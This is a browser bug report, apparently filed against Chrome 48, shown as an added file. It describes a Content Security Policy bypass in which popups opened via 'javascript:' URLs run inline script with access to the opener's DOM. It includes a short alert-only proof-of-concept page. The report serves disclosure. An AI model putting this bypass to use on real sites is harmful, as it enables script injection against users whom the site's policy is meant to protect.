@@ -1,0 +1,29 @@
+UserAgent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
+
+Steps to reproduce the problem:
+Popups opened in the following way execute the contained script (which then have access to the DOM of the opener) even if the page was loaded with a CSP that forbids inline-scripts (works fine in FF):
+
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+  par = 'val';
+  url1 = "javascript:'<scr" + "ipt>alert(`dom: `+document.domain+`\\\nPdom:`+parent.document.domain+`\\\npar: `+opener.par);</scr" + "ipt>'";
+  open(url1);
+  url2 = "javascript:alert(`dom: `+document.domain+`\\\nPdom:`+parent.document.domain+`\\\npar: `+opener.par);";
+  open(url2);
+</script>
+</head>
+</html>
+
+What is the expected behavior?
+Script execution in Popup is blocked due to CSP
+
+What went wrong?
+CSP is inherited to popup opened with "javascript:"-URL
+
+Did this work before? No
+
+Chrome version: 48.0.2564.97  Channel: stable
+OS Version: 6.1 (Windows 7, Windows Server 2008 R2)
+Flash Version: Shockwave Flash 20.0 r0
